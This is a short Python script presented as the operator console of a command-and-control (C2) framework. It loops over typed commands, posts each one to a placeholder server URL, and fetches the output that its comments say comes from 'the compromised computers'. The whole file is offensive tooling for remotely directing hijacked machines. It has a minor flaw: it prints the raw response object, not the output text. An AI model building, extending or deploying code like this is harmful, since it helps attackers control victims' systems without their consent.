## Simple command-line user interface for a C2 framework

import requests

def send_command(command):
    # Send the command to the server using an HTTP POST request
    requests.post('http://server_url/run_command', json={'command': command})

def view_output():
    # Ask the server for the output of the most recent command
    output = requests.get('http://server_url/command_output')

    # Print the output to the command line
    print(output)

while True:
    # Prompt the user for a command
    command = input('Enter a command: ')

    # Send the command to the server
    send_command(command)

    # View the output from the compromised computers
    view_output()
